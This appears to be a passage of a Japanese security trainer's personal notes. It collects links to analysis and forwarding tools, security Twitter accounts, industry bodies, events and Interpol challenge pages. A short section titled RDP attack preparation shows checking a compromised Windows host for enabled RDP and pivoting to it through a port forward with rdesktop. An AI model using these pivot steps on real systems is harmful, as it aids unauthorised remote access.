https://github.com/elceef/dnstwist
・any run
https://app.any.run/
・Netlab
https://scan.netlab.360.com/#/dashboard

■RDPの攻撃準備
C:\Users\user1\Downloads>reg query "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server" |findstr fDenyTSConnections
reg query "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server" |findstr fDenyTSConnections
    fDenyTSConnections    REG_DWORD    0x0
C:\Users\user1\Downloads>netstat -an |findstr 3389
netstat -an |findstr 3389
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    [::]:3389              [::]:0                 LISTENING
>> run network/forward -L 6969:192.168.111.101:3389
# rdesktop -g 640x480 localhost:6969

■その他役に立つ
・ディスクイメージをVMで立ち上げる際にVHDに変換する
Disk2vhd
https://technet.microsoft.com/ja-jp/sysinternals/ee656415.aspx
・フォワーディング
portfwd.exe
https://github.com/bfosterjr/portfwd
Virtual Boxでのフォワーディング例
"portfwd.exe" -l 6969 -a 10.52.2.49 -p 22
・文字コード変換
21decoder
http://yamagata.int21h.jp/tool/21decode/
・録画
AG-デスクトップレコーダー
https://freesoft-100.com/review/ag-desktop-recorder.html#%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89
・トレーニング用
ZoomIt
・攻撃によく使用されるツール
PSEXEC
SDELTE
・py2exe (無償)
http://www.py2exe.org/
Pythonで作成されたプログラムを、Windowsの実行可能ファイル(.exe)に変換します。
・VBEをexeに変換
mexe022
・base64
http://www.vector.co.jp/soft/cmt/win95/util/se128122.html
・Windowsで使えるWhois
Whoisの配布先（フリー）
URL：http://technet.microsoft.com/ja-jp/sysinternals/bb897435
・暗号化サイト
http://fopo.com.ar/
・難読化解析サイト
http://lombokcyber.com/en/detools
・UAの偽装
http://utaukitune.ldblog.jp/archives/65675144.html
・デスクトップ環境のバックアップリストア
http://clonezilla.org/

山崎さんのわかりやすい外部向けの記事
http://www.atmarkit.co.jp/ait/articles/1609/15/news006.html

■トレーニング環境構築で使えそうなもの
http://www.linmin.com/
https://mantl.io/
http://getcloudify.org/
https://wiki.openstack.org/wiki/Ironic
http://www.stacki.com/


■firefoxアドオン
Flag fox
FoxyProxy Standard
Ghostery
NoScript
To Google Translate

■twitter
・国内
@ockeghem
@piyokango
@ntsuji
@tigerszk
@dry2
@hasegawayosuke
@Sh1n0g1
@kitagawa_takuji
@MasafumiNegishi
@ripjyr
@sen_u
@ymzkei5
@codeblue_jp
@PacSecJP
@avtokyo
@BlackHatJapan
@secconctf
@ctf4b
@ctf4g
@WASForum
@yuzawaws
@OwaspJapan
@lac_security
@BurpSuiteJapan
@secusoba
@nilfigo
@InfosecHotSpot
・フォレンジック
@4n6ist
@cci_forensics
@shu_tom
@yarai1978
@hiropooh
@port139
@EijiYoshida
@tessy_jp
@you0708
@kaito834
@vulcain
@nmantani
@cyb3rops
@robtlee
@chadtilbury
@sansforensics


■セキュリティ業界
・団体
JPCERT/CC, NISC, IPA, ICT-ISAC
・セキュリティ企業が加盟できる
IDF, JC3, NCA, JNSA
・イベント
白浜、越後WS、SEC道後、First、SECCON、CODEBLUE、保通協、JSAC、CSS, AV TOKYO,
jc3forum, 情報セキュリティEXPO, Security Days, Macnica Day, AWS Summit
Focus Japan, MPOWER, IIJ Technical Week, Security Camp,
・イベント国外
BlackHat, HTCIA, SANS

■DSC2017
Singapore
https://www.interpol.int/News-and-media/News/2017/N2017-034
https://japan.zdnet.com/article/35098808/
http://www.ipc.nec.co.jp/dashboard/s/media/2017/0327.html

JAPAN
https://www.interpol.int/News-and-media/News/2017/N2017-018

■DSC2018
Interpol
https://www.interpol.int/News-and-media/News/2018/N2018-007
NEC
http://jpn.nec.com/press/201802/20180222_02.html
CDI
https://www.cyberdefense.jp/news/notice/interpol-digital-security-challenge-2.html
